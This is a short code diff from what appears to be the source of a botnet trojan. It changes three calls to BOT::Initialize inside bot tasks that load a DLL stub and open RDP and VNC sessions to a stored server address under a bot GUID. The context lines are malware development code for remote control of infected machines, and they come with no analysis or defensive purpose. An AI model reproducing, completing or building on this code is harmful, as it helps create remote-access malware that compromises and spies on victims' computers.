@@ -810,7 +810,7 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 
 static DWORD WINAPI ProcessDocFind(void*)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 
 	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID);
 	BYTE* data = 0;
@@ -884,7 +884,7 @@ static DWORD WINAPI ProcessRDP(void*)
 	typedef int (WINAPIV* PSTOP)();
 	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);
 
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	char ipServer[16];
 	m_lstrcpy( ipServer, ipServerForRDP );
 	TASKDBG( "Task", "Run RDP, ip %s", ipServer );
@@ -945,7 +945,7 @@ static char ipServerForVNC[16];
 
 static DWORD WINAPI ProcessVNC(void*)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 
 	char ipServer[16];
 	m_lstrcpy( ipServer, ipServerForVNC );
